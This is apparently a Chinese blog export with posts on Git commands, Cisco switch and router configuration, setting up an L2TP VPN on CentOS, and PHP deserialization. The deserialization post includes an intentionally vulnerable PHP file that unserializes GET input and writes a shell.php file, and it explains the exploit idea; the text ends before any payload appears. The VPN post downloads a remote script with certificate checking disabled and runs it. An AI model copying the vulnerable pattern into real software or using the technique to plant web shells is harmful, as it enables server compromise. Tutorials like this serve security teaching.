    <url>/2018/11/22/Git%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h2 id="github-仓库本地初始化"><a href="#github-仓库本地初始化" class="headerlink" title="github 仓库本地初始化"></a>github 仓库本地初始化</h2><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">echo <span class="string">""</span> &gt;&gt; README.md</span><br><span class="line">git init</span><br><span class="line">git <span class="keyword">add</span><span class="bash"> README.md</span></span><br><span class="line">git commit -m <span class="string">"first commit"</span></span><br><span class="line">git remote <span class="keyword">add</span><span class="bash"> origin url</span></span><br><span class="line">git push -u origin master</span><br></pre></td></tr></table></figure>

<h2 id="git-init"><a href="#git-init" class="headerlink" title="git init"></a>git init</h2><pre><code>在本地新建一个repo,进入一个项目目录,执行git init,会初始化一个repo,并在当前文件夹下创建一个.git文件夹.</code></pre><h2 id="git-clone"><a href="#git-clone" class="headerlink" title="git clone"></a>git clone</h2><pre><code>获取一个url对应的远程Git repo, 创建一个local copy.
一般的格式是git clone [url].
clone下来的repo会以url最后一个斜线后面的名称命名,创建一个文件夹,如果想要指定特定的名称,可以git clone [url] newname指定.</code></pre><h2 id="git-status"><a href="#git-status" class="headerlink" title="git status"></a>git status</h2><pre><code>查询repo的状态.
git status -s: -s表示short, -s的输出标记会有两列,第一列是对staging区域而言,第二列是对working目录而言.</code></pre><h2 id="git-log"><a href="#git-log" class="headerlink" title="git log"></a>git log</h2><pre><code>show commit history of a branch.
git log --oneline --number: 每条log只显示一行,显示number条.
git log --oneline --graph:可以图形化地表示出分支合并历史.
git log branchname可以显示特定分支的log.
git log --oneline branch1 ^branch2,可以查看在分支1,却不在分支2中的提交.^表示排除这个分支(Window下可能要给^branch2加上引号).
git log --decorate会显示出tag信息.
git log --author=[author name] 可以指定作者的提交历史.
git log --since --before --until --after 根据提交时间筛选log.
--no-merges可以将merge的commits排除在外.
git log --grep 根据commit信息过滤log: git log --grep=keywords
默认情况下, git log --grep --author是OR的关系,即满足一条即被返回,如果你想让它们是AND的关系,可以加上--all-match的option.
git log -S: filter by introduced diff.
比如: git log -SmethodName (注意S和后面的词之间没有等号分隔).
git log -p: show patch introduced at each commit.
每一个提交都是一个快照(snapshot),Git会把每次提交的diff计算出来,作为一个patch显示给你看.
另一种方法是git show [SHA].
git log --stat: show diffstat of changes introduced at each commit.
同样是用来看改动的相对信息的,--stat比-p的输出更简单一些.</code></pre><h2 id="git-add"><a href="#git-add" class="headerlink" title="git add"></a>git add</h2><pre><code>在提交之前,Git有一个暂存区(staging area),可以放入新添加的文件或者加入新的改动. commit时提交的改动是上一次加入到staging area中的改动,而不是我们disk上的改动.
git add .
会递归地添加当前工作目录中的所有文件.</code></pre><h2 id="git-diff"><a href="#git-diff" class="headerlink" title="git diff"></a>git diff</h2><pre><code>不加参数的git diff:
show diff of unstaged changes.
此命令比较的是工作目录中当前文件和暂存区域快照之间的差异,也就是修改之后还没有暂存起来的变化内容.

若要看已经暂存起来的文件和上次提交时的快照之间的差异,可以用:
git diff --cached 命令.
show diff of staged changes.
(Git 1.6.1 及更高版本还允许使用 git diff --staged，效果是相同的).

git diff HEAD
show diff of all staged or unstated changes.
也即比较woking directory和上次提交之间所有的改动.

如果想看自从某个版本之后都改动了什么,可以用:
git diff [version tag]
跟log命令一样,diff也可以加上--stat参数来简化输出.

git diff [branchA] [branchB]可以用来比较两个分支.
它实际上会返回一个由A到B的patch,不是我们想要的结果.
一般我们想要的结果是两个分支分开以后各自的改动都是什么,是由命令:
git diff [branchA]…[branchB]给出的.
实际上它是:git diff $(git merge-base [branchA] [branchB]) [branchB]的结果.</code></pre><h2 id="git-commit"><a href="#git-commit" class="headerlink" title="git commit"></a>git commit</h2><pre><code>提交已经被add进来的改动.
git commit -m “the commit message&quot;
git commit -a 会先把所有已经track的文件的改动add进来,然后提交(有点像svn的一次提交,不用先暂存). 对于没有track的文件,还是需要git add一下.
git commit --amend 增补提交. 会使用与当前提交节点相同的父节点进行一次新的提交,旧的提交将会被取消.</code></pre><h2 id="git-reset"><a href="#git-reset" class="headerlink" title="git reset"></a>git reset</h2><pre><code>undo changes and commits.
这里的HEAD关键字指的是当前分支最末梢最新的一个提交.也就是版本库中该分支上的最新版本.
git reset HEAD: unstage files from index and reset pointer to HEAD
这个命令用来把不小心add进去的文件从staged状态取出来,可以单独针对某一个文件操作: git reset HEAD - - filename, 这个- - 也可以不加.
git reset --soft
move HEAD to specific commit reference, index and staging are untouched.
git reset --hard
unstage files AND undo any changes in the working directory since last commit.
使用git reset —hard HEAD进行reset,即上次提交之后,所有staged的改动和工作目录的改动都会消失,还原到上次提交的状态.
这里的HEAD可以被写成任何一次提交的SHA-1.
不带soft和hard参数的git reset,实际上带的是默认参数mixed.

总结:
git reset --mixed id,是将git的HEAD变了(也就是提交记录变了),但文件并没有改变，(也就是working tree并没有改变). 取消了commit和add的内容.
git reset --soft id. 实际上，是git reset –mixed id 后,又做了一次git add.即取消了commit的内容.
git reset --hard id.是将git的HEAD变了,文件也变了.
按改动范围排序如下:
soft (commit) &lt; mixed (commit + add) &lt; hard (commit + add + local working)</code></pre><h2 id="git-revert"><a href="#git-revert" class="headerlink" title="git revert"></a>git revert</h2><pre><code>反转撤销提交.只要把出错的提交(commit)的名字(reference)作为参数传给命令就可以了.
git revert HEAD: 撤销最近的一个提交.
git revert会创建一个反向的新提交,可以通过参数-n来告诉Git先不要提交.</code></pre><h2 id="git-rm"><a href="#git-rm" class="headerlink" title="git rm"></a>git rm</h2><pre><code>git rm file: 从staging区移除文件,同时也移除出工作目录.
git rm --cached: 从staging区移除文件,但留在工作目录中.
git rm --cached从功能上等同于git reset HEAD,清除了缓存区,但不动工作目录树.</code></pre><h2 id="git-clean"><a href="#git-clean" class="headerlink" title="git clean"></a>git clean</h2><pre><code>git clean是从工作目录中移除没有track的文件.
通常的参数是git clean -df:
-d表示同时移除目录,-f表示force,因为在git的配置文件中, clean.requireForce=true,如果不加-f,clean将会拒绝执行.</code></pre><h2 id="git-mv"><a href="#git-mv" class="headerlink" title="git mv"></a>git mv</h2><pre><code>git rm - - cached orig; mv orig new; git add new</code></pre><h2 id="git-stash"><a href="#git-stash" class="headerlink" title="git stash"></a>git stash</h2><pre><code>把当前的改动压入一个栈.
git stash将会把当前目录和index中的所有改动(但不包括未track的文件)压入一个栈,然后留给你一个clean的工作状态,即处于上一次最新提交处.
git stash list会显示这个栈的list.
git stash apply:取出stash中的上一个项目(stash@{0}),并且应用于当前的工作目录.
也可以指定别的项目,比如git stash apply stash@{1}.
如果你在应用stash中项目的同时想要删除它,可以用git stash pop

删除stash中的项目:
git stash drop: 删除上一个,也可指定参数删除指定的一个项目.
git stash clear: 删除所有项目.</code></pre><h2 id="git-branch"><a href="#git-branch" class="headerlink" title="git branch"></a>git branch</h2><pre><code>git branch可以用来列出分支,创建分支和删除分支.
git branch -v可以看见每一个分支的最后一次提交.
git branch: 列出本地所有分支,当前分支会被星号标示出.
git branch (branchname): 创建一个新的分支(当你用这种方式创建分支的时候,分支是基于你的上一次提交建立的). 
git branch -d (branchname): 删除一个分支.
删除remote的分支:
git push (remote-name) :(branch-name): delete a remote branch.
这个是因为完整的命令形式是:
git push remote-name local-branch:remote-branch
而这里local-branch的部分为空,就意味着删除了remote-branch</code></pre><h2 id="git-checkout"><a href="#git-checkout" class="headerlink" title="git checkout"></a>git checkout</h2><p>　　git checkout (branchname)</p>
<pre><code>切换到一个分支.
 git checkout -b (branchname): 创建并切换到新的分支.
 这个命令是将git branch newbranch和git checkout newbranch合在一起的结果.
 checkout还有另一个作用:替换本地改动:
 git checkout --&lt;filename&gt;
 此命令会使用HEAD中的最新内容替换掉你的工作目录中的文件.已添加到暂存区的改动以及新文件都不会受到影响.
 注意:git checkout filename会删除该文件中所有没有暂存和提交的改动,这个操作是不可逆的.</code></pre><h2 id="git-merge"><a href="#git-merge" class="headerlink" title="git merge"></a>git merge</h2><pre><code>把一个分支merge进当前的分支.
git merge [alias]/[branch]
把远程分支merge到当前分支.

如果出现冲突,需要手动修改,可以用git mergetool.
解决冲突的时候可以用到git diff,解决完之后用git add添加,即表示冲突已经被resolved.</code></pre><h2 id="git-tag"><a href="#git-tag" class="headerlink" title="git tag"></a>git tag</h2><pre><code>tag a point in history as import.
会在一个提交上建立永久性的书签,通常是发布一个release版本或者ship了什么东西之后加tag.
比如: git tag v1.0
git tag -a v1.0, -a参数会允许你添加一些信息,即make an annotated tag.
当你运行git tag -a命令的时候,Git会打开一个编辑器让你输入tag信息.

我们可以利用commit SHA来给一个过去的提交打tag:
git tag -a v0.9 XXXX

push的时候是不包含tag的,如果想包含,可以在push时加上--tags参数.
fetch的时候,branch HEAD可以reach的tags是自动被fetch下来的, tags that aren’t reachable from branch heads will be skipped.如果想确保所有的tags都被包含进来,需要加上--tags选项.</code></pre><h2 id="git-remote"><a href="#git-remote" class="headerlink" title="git remote"></a>git remote</h2><pre><code>list, add and delete remote repository aliases.
因为不需要每次都用完整的url,所以Git为每一个remote repo的url都建立一个别名,然后用git remote来管理这个list.
git remote: 列出remote aliases.
如果你clone一个project,Git会自动将原来的url添加进来,别名就叫做:origin.
git remote -v:可以看见每一个别名对应的实际url.
git remote add [alias] [url]: 添加一个新的remote repo.
git remote rm [alias]: 删除一个存在的remote alias.
git remote rename [old-alias] [new-alias]: 重命名.
git remote set-url [alias] [url]:更新url. 可以加上—push和fetch参数,为同一个别名set不同的存取地址.</code></pre><h2 id="git-fetch"><a href="#git-fetch" class="headerlink" title="git fetch"></a>git fetch</h2><pre><code>download new branches and data from a remote repository.
可以git fetch [alias]取某一个远程repo,也可以git fetch --all取到全部repo
fetch将会取到所有你本地没有的数据,所有取下来的分支可以被叫做remote branches,它们和本地分支一样(可以看diff,log等,也可以merge到其他分支),但是Git不允许你checkout到它们. </code></pre><h2 id="git-pull"><a href="#git-pull" class="headerlink" title="git pull"></a>git pull</h2><pre><code>fetch from a remote repo and try to merge into the current branch.
pull == fetch + merge FETCH_HEAD
git pull会首先执行git fetch,然后执行git merge,把取来的分支的head merge到当前分支.这个merge操作会产生一个新的commit.    
如果使用--rebase参数,它会执行git rebase来取代原来的git merge.</code></pre><h2 id="git-rebase"><a href="#git-rebase" class="headerlink" title="git rebase"></a>git rebase</h2><pre><code>--rebase不会产生合并的提交,它会将本地的所有提交临时保存为补丁(patch),放在”.git/rebase”目录中,然后将当前分支更新到最新的分支尖端,最后把保存的补丁应用到分支上.
rebase的过程中,也许会出现冲突,Git会停止rebase并让你解决冲突,在解决完冲突之后,用git add去更新这些内容,然后无需执行commit,只需要:
git rebase --continue就会继续打余下的补丁.
git rebase --abort将会终止rebase,当前分支将会回到rebase之前的状态.</code></pre><h2 id="git-push"><a href="#git-push" class="headerlink" title="git push"></a>git push</h2><pre><code>push your new branches and data to a remote repository.
git push [alias] [branch]
将会把当前分支merge到alias上的[branch]分支.如果分支已经存在,将会更新,如果不存在,将会添加这个分支.
如果有多个人向同一个remote repo push代码, Git会首先在你试图push的分支上运行git log,检查它的历史中是否能看到server上的branch现在的tip,如果本地历史中不能看到server的tip,说明本地的代码不是最新的,Git会拒绝你的push,让你先fetch,merge,之后再push,这样就保证了所有人的改动都会被考虑进来.</code></pre><h2 id="git-reflog"><a href="#git-reflog" class="headerlink" title="git reflog"></a>git reflog</h2><pre><code>git reflog是对reflog进行管理的命令,reflog是git用来记录引用变化的一种机制,比如记录分支的变化或者是HEAD引用的变化.
当git reflog不指定引用的时候,默认列出HEAD的reflog.
HEAD@{0}代表HEAD当前的值,HEAD@{3}代表HEAD在3次变化之前的值.
git会将变化记录到HEAD对应的reflog文件中,其路径为.git/logs/HEAD, 分支的reflog文件都放在.git/logs/refs目录下的子目录中.</code></pre><h2 id="特殊符号"><a href="#特殊符号" class="headerlink" title="特殊符号:"></a>特殊符号:</h2><pre><code>^代表父提交,当一个提交有多个父提交时,可以通过在^后面跟上一个数字,表示第几个父提交: ^相当于^1.
~&lt;n&gt;相当于连续的&lt;n&gt;个^.</code></pre><p>原帖地址:<br>    <a href="https://www.cnblogs.com/my--sunshine/p/7093412.html" target="_blank" rel="noopener">https://www.cnblogs.com/my–sunshine/p/7093412.html</a></p>
]]></content>
      <categories>
        <category>Git</category>
      </categories>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>PT基本配置练习</title>
    <url>/2018/11/18/PT%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE%E7%BB%83%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="配置主机"><a href="#配置主机" class="headerlink" title="配置主机"></a>配置主机</h2><ul>
<li>ip 、子网掩码、默认网关<blockquote>
<p>ip 、子网掩码在表格中<br>网关配置路由器 ip 即可</p>
</blockquote>
</li>
</ul>
<h2 id="交换机-switch"><a href="#交换机-switch" class="headerlink" title="交换机(switch)"></a>交换机(switch)</h2><h3 id="配置主机名称"><a href="#配置主机名称" class="headerlink" title="配置主机名称"></a>配置主机名称</h3><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&gt; enable</span><br><span class="line"><span class="comment"># conf t</span></span><br><span class="line"><span class="comment"># hostname &lt;name&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="特权-EXEC-密码"><a href="#特权-EXEC-密码" class="headerlink" title="特权 EXEC 密码"></a>特权 EXEC 密码</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> <span class="built_in">enable</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> conf t</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">enable</span> secret &lt;password&gt;</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">exit</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">disable</span>		//验证</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">enable</span>		//验证</span></span><br><span class="line">				//输入密码，登入即可</span><br></pre></td></tr></table></figure>

<h3 id="用户-EXEC-密码"><a href="#用户-EXEC-密码" class="headerlink" title="用户 EXEC 密码"></a>用户 EXEC 密码</h3><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># line console 0</span></span><br><span class="line"><span class="meta"># password &lt;password&gt;</span></span><br><span class="line"><span class="meta"># login</span></span><br><span class="line"><span class="meta"># exit</span></span><br></pre></td></tr></table></figure>

<h3 id="VTY-线路密码"><a href="#VTY-线路密码" class="headerlink" title="VTY 线路密码"></a>VTY 线路密码</h3><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># line vty 0 15</span></span><br><span class="line"><span class="meta"># password &lt;password&gt;</span></span><br><span class="line"><span class="meta"># login</span></span><br><span class="line"><span class="meta"># exit</span></span><br></pre></td></tr></table></figure>

<h3 id="加密密码"><a href="#加密密码" class="headerlink" title="加密密码"></a>加密密码</h3><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># service password-encryption</span></span><br></pre></td></tr></table></figure>

<h3 id="标语"><a href="#标语" class="headerlink" title="标语"></a>标语</h3><p><code># banner motd # &lt;content&gt; #</code></p>
<h3 id="配置-ip-、子网掩码、默认网关-VLAN"><a href="#配置-ip-、子网掩码、默认网关-VLAN" class="headerlink" title="配置 ip 、子网掩码、默认网关(VLAN)"></a>配置 ip 、子网掩码、默认网关(VLAN)</h3><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line">&gt; enable</span><br><span class="line"><span class="meta"># int vlan 1</span></span><br><span class="line"><span class="meta"># ip address &lt;ip-address&gt; &lt;mask&gt;</span></span><br><span class="line"><span class="meta"># description &lt;description&gt;			//描述</span></span><br><span class="line"><span class="meta"># no shutdown</span></span><br><span class="line"><span class="meta"># exit</span></span><br><span class="line"><span class="meta"># ip default-gateway &lt;gateway&gt;</span></span><br><span class="line"><span class="meta"># exit</span></span><br></pre></td></tr></table></figure>

<h2 id="路由器-route"><a href="#路由器-route" class="headerlink" title="路由器(route)"></a>路由器(route)</h2><h3 id="ip-、子网掩码"><a href="#ip-、子网掩码" class="headerlink" title="ip 、子网掩码"></a>ip 、子网掩码</h3><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">&gt; enable</span><br><span class="line"># conf t</span><br><span class="line"># <span class="keyword">interface</span> &lt;<span class="symbol">type</span>&gt; &lt;<span class="symbol">num</span>&gt;</span><br><span class="line"># <span class="symbol">ip</span> <span class="symbol">address</span> &lt;<span class="symbol">ip</span>&gt; &lt;<span class="symbol">mask</span>&gt;</span><br><span class="line"># <span class="symbol">description</span> &lt;<span class="symbol">description</span>&gt;</span><br><span class="line"># <span class="symbol">no</span> <span class="symbol">shutdown</span></span><br><span class="line"># <span class="symbol">exit</span></span><br></pre></td></tr></table></figure>

<h2 id="保存配置"><a href="#保存配置" class="headerlink" title="保存配置"></a>保存配置</h2><p><code># copy running-config start-config</code></p>
]]></content>
      <tags>
        <tag>PT练习</tag>
        <tag>cisco</tag>
      </tags>
  </entry>
  <entry>
    <title>Centos7 搭建 l2tp vpn</title>
    <url>/2018/11/16/Centos7-%E6%90%AD%E5%BB%BA-l2tp-vpn/</url>
    <content><![CDATA[<h1 id="安装服务"><a href="#安装服务" class="headerlink" title="安装服务"></a>安装服务</h1><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># wget --no-check-certificate https://raw.githubusercontent.com/teddysun/across/master/l2tp.sh</span></span><br><span class="line"><span class="meta"># chmod +x l2tp.sh</span></span><br><span class="line"><span class="meta"># ./l2tp.sh</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>最后会进行初次配置</p>
</li>
<li><p>然后重启服务</p>
</li>
</ul>
<figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># service ipsec restart</span></span><br><span class="line"><span class="meta"># service xl2tpd restart</span></span><br><span class="line"><span class="meta"># ipsec verify</span></span><br></pre></td></tr></table></figure>

<h1 id="添加，更改用户"><a href="#添加，更改用户" class="headerlink" title="添加，更改用户"></a>添加，更改用户</h1><ul>
<li>编辑 /etc/ppp/chap-secrets 文件即可</li>
<li>格式: <code>&lt;user&gt;        l2tp    &lt;password&gt;</code></li>
</ul>
<hr>
]]></content>
      <categories>
        <category>vpn</category>
      </categories>
      <tags>
        <tag>vpn</tag>
        <tag>l2tp</tag>
      </tags>
  </entry>
  <entry>
    <title>序列化和反序列化</title>
    <url>/2018/11/01/%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h1 id="什么是序列化-amp-反序列化"><a href="#什么是序列化-amp-反序列化" class="headerlink" title="什么是序列化&amp;反序列化"></a>什么是序列化&amp;反序列化</h1><ul>
<li><p>序列化: 序列化是将变量转换为可保存或传输的字符串的过程。</p>
</li>
<li><p>反序列化:将在序列化过程中所生成的字符串再转化成原来的变量使用。</p>
</li>
</ul>
<h1 id="PHP序列化的方法"><a href="#PHP序列化的方法" class="headerlink" title="PHP序列化的方法"></a>PHP序列化的方法</h1><blockquote>
<p>PHP最初通过内置的<code>serialize()</code>和<code>unserialize()</code>函数来实现序列化。<code>serialize()</code>的参数可以是<code>resource</code>类型外的所有变量类型，最常见的是用来序列化对象，<code>unseialize()</code>将<code>serialize</code>的返回结果作为参数，进行反序列化，得到原对象<br>对不受信任的数据上使用内置的<code>unserialize()</code>函数时，通常是有风险的。<br>对于对象有两种“魔术方法”，<code>__sleep()</code>和<code>__wakeup()</code>，可以在类别中实现。而会分别从<code>serialize()</code>和<code>unserialize()</code>中调用，对应于清理和恢复对象的功能。例如，在序列化时可能需要关闭数据库连线，并在反序列化时恢复连线；这个功能可在这两种魔术方法中处理。它们也允许对象选择哪些属性可被序列化。<br>从PHP 5.1开始有面向对象的序列化机制，即为<code>Serializable</code>接口。</p>
</blockquote>
<h1 id="PHP序列化的作用"><a href="#PHP序列化的作用" class="headerlink" title="PHP序列化的作用"></a>PHP序列化的作用</h1><h2 id="对象序列化使用情况"><a href="#对象序列化使用情况" class="headerlink" title="对象序列化使用情况:"></a>对象序列化使用情况:</h2><blockquote>
<ul>
<li>对象的创建的时候被存储到内存里，在解析的时候被销毁，如果机器重启，那么对象也将被销毁在新建。想要保存对象或者将对象传给另一台机器，就需要将对象序列化；或者在需要存储数据到mysql等数据库中时需要序列化。</li>
<li>将对象转化成字符串叫序列化</li>
<li>将字符串转化成对象叫反序列化</li>
</ul>
</blockquote>
<p><font size="4">总之，就是<strong><font color="red">方便数据传输</font></strong>和<strong><font color="red">存储</font></strong></font></p>
<br>
# 实例说明

<figure class="highlight clean"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">################建立一个数组###################</span><br><span class="line">$arr1 = [];</span><br><span class="line">for($i=<span class="number">0</span>; $i&lt;<span class="number">5</span>; $i++)</span><br><span class="line">	$arr1[<span class="string">'key'</span>.$i] = <span class="string">'value'</span>.$i;</span><br><span class="line">echo <span class="string">"建立一个数组arr1:"</span>;</span><br><span class="line">print_r($arr1);</span><br><span class="line">echo <span class="string">"&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;"</span>;</span><br><span class="line">##############################################</span><br><span class="line"></span><br><span class="line">################序列化该数组###################</span><br><span class="line">$arr_serialize = serialize($arr1);</span><br><span class="line">echo <span class="string">"arr1序列化后为:"</span>;</span><br><span class="line">print_r($arr_serialize);</span><br><span class="line">echo <span class="string">"&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;"</span>;</span><br><span class="line">##############################################</span><br><span class="line"></span><br><span class="line">###############反序列化后输出##################</span><br><span class="line">$arr_back = unserialize($arr_serialize);</span><br><span class="line">echo <span class="string">"arr_serialize反序列化后为:"</span>;</span><br><span class="line">print_r($arr_back);</span><br><span class="line">##############################################</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>输出结果如下<img src="https://hnxkvw.sn.files.1drv.com/y4mwGUw-A2V2k_Uu5w-T-Ou8Z3YabDPIF42dF4POXVs1Hbyc8v6Ez65bYZm45qXY1XFPpQp_9H5RjldDUssJfjsRT0rKJh_XdlC21jmvVYuyQ9IVrOAG07dUK1y951w9KvSdKnJu7-bi8halyTaEz59Z7gvExnhYB9ueC-O0Gp9wjzbqm48YGQkvlJbahxxGxA_G6nnWC3YlJKZ-vJ4vTI59Q?width=1022&height=201&cropmode=none" alt></p>
<p>注意这里序列化后的开头处是 <code>a</code> </p>
<p>再给出一段代码</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;			<span class="comment">#这里定义一个类</span></span></span><br><span class="line"><span class="php">	<span class="keyword">var</span> $value = <span class="string">'abc123'</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$obj = <span class="keyword">new</span> test;	<span class="comment">#new一个对象obj出来</span></span></span><br><span class="line"><span class="php">$obj_serialize = serialize($obj); <span class="comment">#将obj序列化</span></span></span><br><span class="line"><span class="php">print_r($obj_serialize);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;"</span>;</span></span><br><span class="line"><span class="php">$obj_back = unserialize($obj_serialize); <span class="comment">#反序列化obj_serialize</span></span></span><br><span class="line"><span class="php">print_r($obj_back);</span></span><br><span class="line"><span class="php"> <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>输出结果为:<img src="https://hnxnvw.sn.files.1drv.com/y4mOCAkyMZKdYGn_dUWItGK-X1xd6zG1A6OVRPckNuSP2o3z6XQpizP9oJeCH-SqRfzXn_gEH5bRC9W-3tG1X6bszPqeByolKchltdhOF5Jdy0-fssKIf0lCuIsivVJBk5b9Hia7dQfa8sd4EDsNEOINzk7A6wP7iHmqNAn4l3yc9z8EuCZGUi2uBLroUG42s0fVepckc0Vn26y0nJpAeVw3Q?width=292&height=89&cropmode=none" alt></p>
<ul>
<li>发现不同之处</li>
<li>当一个数组序列化时，以<code>a</code> 为标志，对象序列化是以 <code>O</code> 为标志</li>
<li>由此可以解读 PHP 序列化:<blockquote>
<p>a 代表的是 array 数组，5代表变量名称有几个字符， s 代表 string字符串类型，4 为 几个字符，后面的是字符串本身……<br>O 代表 object 对象；4代表的是序列化的对象名称有几个字符；对象名称；1为对象有一个值……</p>
</blockquote>
</li>
</ul>
<h1 id="unserialize-反序列化函数漏洞"><a href="#unserialize-反序列化函数漏洞" class="headerlink" title="unserialize()反序列化函数漏洞"></a>unserialize()反序列化函数漏洞</h1><blockquote>
<p>有前面的铺垫，我们可知道序列化得到的字符串是可解读的，那么如果精心构造一个字符串传给unserialize()进行反序列化，就可以控制到我们想控制的东西</p>
</blockquote>
<ul>
<li><p>前面提到过，当 PHP 调用<code>serizlize()</code>和<code>unserialize()</code>函数时，会调用<code>__sleep()</code>和<code>__wakeup()</code>两个魔术方法(Magic function)</p>
</li>
<li><p>先介绍下魔术方法:</p>
</li>
</ul>
<h2 id="魔术方法-Magic-function"><a href="#魔术方法-Magic-function" class="headerlink" title="魔术方法(Magic function)"></a>魔术方法(Magic function)</h2><p>在命名自己的类方法时不能使用这些方法名，除非是想用其魔术功能。<br><a href="https://secure.php.net/manual/zh/language.oop5.magic.php" target="_blank" rel="noopener">PHP官方文档-魔术方法</a><br><a href="http://www.php.cn/php-weizijiaocheng-406955.html" target="_blank" rel="noopener">PHP中文网-魔术方法</a></p>
<p>利用反序列化漏洞</p>
<h2 id="unserialize-调用-wakeup-魔术方法"><a href="#unserialize-调用-wakeup-魔术方法" class="headerlink" title="unserialize()调用__wakeup()魔术方法"></a><code>unserialize()</code>调用<code>__wakeup()</code>魔术方法</h2><ul>
<li><p>一个例子:</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;			<span class="comment">#这里定义一个类</span></span></span><br><span class="line"><span class="php">	<span class="keyword">var</span> $value = <span class="string">'abc123'</span>;</span></span><br><span class="line"><span class="php">	<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">		<span class="keyword">echo</span> <span class="string">"__wakeup&lt;/br&gt;"</span>;</span></span><br><span class="line"><span class="php">	&#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$demo = unserialize(<span class="string">'O:4:"test":1:&#123;s:5:"value";s:6:"abc123";&#125;'</span>);</span></span><br><span class="line"><span class="php"><span class="comment">#O:4:"test":1:&#123;s:5:"value";s:6:"abc123";&#125;是序列化test-&gt;value的值</span></span></span><br><span class="line"><span class="php">print_r($demo);</span></span><br><span class="line"><span class="php"> <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
</li>
<li><p>结果如下:<br>明显<code>unserialize()</code>调用了<code>__wakeup()</code><br><img src="https://hnxmvw.sn.files.1drv.com/y4mLO8sjjujtidnCGjcFM7nb8SOxswXTR_aeh2clsSCDT6rInjTXurhjKaAFk4rbizr277KZK56GNdO6m3QAGpGGVOLk1vCVcLar8UFCSN5wGQnpT0XR6pSwI29nqX7Byc4ffbYNoL0M9SkTp6jnmHMCinF7R0vGCh3Bd0tYxyaXsm0hmnSGU04LOylqWsXDBBLPuIkL08WNnFKd6SDdAhLSw?width=345&height=56&cropmode=none" alt></p>
</li>
</ul>
<h2 id="利用unserialize-函数漏洞"><a href="#利用unserialize-函数漏洞" class="headerlink" title="利用unserialize()函数漏洞"></a>利用unserialize()函数漏洞</h2><ul>
<li>环境:</li>
<li>index.php和shell.php</li>
</ul>
<p>index.php</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span></span><br><span class="line"><span class="php">	<span class="keyword">var</span> $value = <span class="string">'123'</span>;</span></span><br><span class="line"><span class="php">	<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">		$fp = fopen(<span class="string">"shell.php"</span>,<span class="string">"w"</span>) ;</span></span><br><span class="line"><span class="php">		fwrite($fp,<span class="keyword">$this</span>-&gt;value);</span></span><br><span class="line"><span class="php">		fclose($fp);</span></span><br><span class="line"><span class="php">	&#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$get = $_GET[<span class="string">'getvalue'</span>];</span></span><br><span class="line"><span class="php">unserialize($get);</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<ul>
<li>我们可以控制序列化的字符串达到利用<code>__wakeup()</code>函数的目的</li>
<li>这里构造一个包含有<code>phpinfo();</code>的字符串</li>
</ul>
<p>PHP脚本如下:</p>
